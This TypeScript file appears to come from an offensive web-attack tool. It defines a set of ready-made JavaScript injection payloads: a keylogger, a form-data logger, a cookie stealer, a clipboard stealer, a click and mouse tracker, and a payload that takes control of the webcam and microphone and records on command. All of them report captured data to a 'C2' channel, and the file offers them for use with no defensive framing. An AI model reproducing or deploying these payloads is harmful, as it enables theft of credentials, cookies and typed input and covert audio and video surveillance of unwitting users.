
import type { JsPayload } from '@/components/javascript-library';

export const PREMADE_PAYLOADS: JsPayload[] = [
    {
        name: "Basic Keylogger",
        description: "Captures and exfiltrates every key pressed by the user.",
        code: `
(function() {
    const channel = new BroadcastChannel('netrax_c2_channel');
    const sessionId = 'session-' + Date.now();
    document.addEventListener('keydown', (e) => {
        channel.postMessage({
            sessionId: sessionId, type: 'keystroke',
            data: { key: e.key, target: e.target.name || e.target.id || e.target.tagName },
            timestamp: new Date().toISOString(), url: window.location.href, userAgent: navigator.userAgent
        });
    }, true);
})();
`.trim(),
    },
    {
        name: "Form Submission Logger",
        description: "Intercepts all form submissions on the page and sends the captured data.",
        code: `
(function() {
    const channel = new BroadcastChannel('netrax_c2_channel');
    const sessionId = 'session-' + Date.now();
    document.addEventListener('submit', (e) => {
        const formData = new FormData(e.target);
        const data = Object.fromEntries(formData.entries());
        channel.postMessage({
            sessionId: sessionId, type: 'form-submit', data: { data },
            timestamp: new Date().toISOString(), url: window.location.href, userAgent: navigator.userAgent
        });
    }, true);
})();
`.trim(),
    },
    {
        name: "Cookie Stealer",
        description: "Grabs all non-HttpOnly cookies from the document and exfiltrates them.",
        code: `
(function() {
    const channel = new BroadcastChannel('netrax_c2_channel');
    const sessionId = 'session-' + Date.now();
    const cookies = document.cookie;
    if (cookies) {
        channel.postMessage({
            sessionId: sessionId, type: 'cookie-stealer', data: { cookies: cookies },
            timestamp: new Date().toISOString(), url: window.location.href, userAgent: navigator.userAgent
        });
    }
})();
`.trim(),
    },
    {
        name: "Clipboard Stealer",
        description: "Reads the content of the user's clipboard when they paste into the page.",
        code: `
(function() {
    const channel = new BroadcastChannel('netrax_c2_channel');
    const sessionId = 'session-' + Date.now();
    document.addEventListener('paste', async (e) => {
        const text = await navigator.clipboard.readText();
        channel.postMessage({
            sessionId: sessionId, type: 'clipboard-read', data: { pastedText: text },
            timestamp: new Date().toISOString(), url: window.location.href, userAgent: navigator.userAgent
        });
    }, true);
})();
`.trim(),
    },
     {
        name: "Click Logger",
        description: "Logs every click on the page, including coordinates and the clicked element.",
        code: `
(function() {
    const channel = new BroadcastChannel('netrax_c2_channel');
    const sessionId = 'session-' + Date.now();
     document.addEventListener('click', (e) => {
        channel.postMessage({
            sessionId: sessionId, type: 'click', 
            data: { x: e.clientX, y: e.clientY, target: e.target.innerText ? e.target.innerText.substring(0, 50) : e.target.tagName },
            timestamp: new Date().toISOString(), url: window.location.href, userAgent: navigator.userAgent
        });
    }, true);
})();
`.trim(),
    },
    {
        name: "Full Recon Payload",
        description: "The default payload that captures keystrokes, clicks, mouse movement, and form submissions.",
        code: `
(function() {
    const channel = new BroadcastChannel('netrax_c2_channel');
    const sessionId = 'session-' + Date.now() + '-' + Math.random().toString(36).substring(2, 9);
    
    function exfiltrate(type, data) {
        const payload = {
            sessionId: sessionId, type: type, data: data,
            timestamp: new Date().toISOString(), url: window.location.href, userAgent: navigator.userAgent
        };
        channel.postMessage(payload);
    }

    exfiltrate('connection', { message: 'Payload activated on page.' });

    document.addEventListener('keydown', (e) => {
        exfiltrate('keystroke', { key: e.key, target: e.target.name || e.target.id || e.target.tagName });
    }, true);

    document.addEventListener('click', (e) => {
        exfiltrate('click', { x: e.clientX, y: e.clientY, target: e.target.innerText ? e.target.innerText.substring(0, 50) : e.target.tagName });
    }, true);

    let lastMove = 0;
    document.addEventListener('mousemove', (e) => {
        if (Date.now() - lastMove > 200) {
            exfiltrate('mousemove', { x: e.clientX, y: e.clientY });
            lastMove = Date.now();
        }
    });

    document.addEventListener('submit', (e) => {
        const formData = new FormData(e.target);
        const data = Object.fromEntries(formData.entries());
        exfiltrate('form-submit', { data });
    }, true);
})();
`.trim(),
    },
    {
        name: "Device Access &amp; C2",
        description: "Requests webcam/mic access and listens for C2 commands to stream media.",
        code: `
(function() {
    const channel = new BroadcastChannel('netrax_c2_channel');
    const sessionId = 'session-' + Date.now() + '-' + Math.random().toString(36).substring(2, 9);
    let mediaStream = null;
    let videoRecorder = null;
    let audioRecorder = null;

    function exfiltrate(type, data) {
        channel.postMessage({ sessionId, type, data, timestamp: new Date().toISOString(), url: window.location.href, userAgent: navigator.userAgent });
    }

    async function getMediaPermissions(video = true, audio = true) {
        if (mediaStream && mediaStream.active) return mediaStream;
        try {
            mediaStream = await navigator.mediaDevices.getUserMedia({ video, audio });
            exfiltrate('connection', { message: 'Permissions granted.' });
            return mediaStream;
        } catch (err) {
            exfiltrate('connection', { message: 'Permissions denied: ' + err.message });
            return null;
        }
    }
    
    function startRecording(recorder, streamType) {
        if (recorder && recorder.state === 'inactive') {
            recorder.start(500); // Send chunk every 500ms
            exfiltrate('connection', { message: streamType + ' recording started.' });
        }
    }
    
    function stopRecording(recorder, streamType) {
        if (recorder && recorder.state === 'recording') {
            recorder.stop();
            exfiltrate('connection', { message: streamType + ' recording stopped.' });
        }
    }
    
    function createRecorder(stream, mimeType) {
         const recorder = new MediaRecorder(stream, { mimeType });
         recorder.ondataavailable = async (event) => {
            if (event.data.size > 0) {
                const chunk = await event.data.arrayBuffer();
                exfiltrate('media-stream', { type: mimeType, size: event.data.size, chunk });
            }
        };
        return recorder;
    }

    // Immediately ask for permissions when the payload loads.
    getMediaPermissions();

    channel.addEventListener('message', async (event) => {
        if (event.data.type !== 'command' || (event.data.sessionId && event.data.sessionId !== sessionId)) return;

        const command = event.data.command;
        const stream = await getMediaPermissions();
        if (!stream) return;

        switch (command) {
            case 'start-video':
                 // This command will now just ensure permissions are active and the stream is sent
                 channel.postMessage({ type: 'media-stream', sessionId, data: { stream } });
                break;
            case 'capture-image':
                const track = stream.getVideoTracks()[0];
                const imageCapture = new ImageCapture(track);
                const blob = await imageCapture.takePhoto();
                exfiltrate('media-stream', { type: 'image/png', size: blob.size, chunk: await blob.arrayBuffer() });
                break;
            case 'start-video-record':
                videoRecorder = createRecorder(stream, 'video/webm');
                startRecording(videoRecorder, 'Video');
                break;
            case 'stop-video-record':
                stopRecording(videoRecorder, 'Video');
                break;
            case 'start-audio-record':
                audioRecorder = createRecorder(stream, 'audio/webm');
                startRecording(audioRecorder, 'Audio');
                break;
            case 'stop-audio-record':
                stopRecording(audioRecorder, 'Audio');
                break;
        }
    });

    exfiltrate('connection', { message: 'Device Access Payload loaded.' });
})();
`.trim(),
    }
];
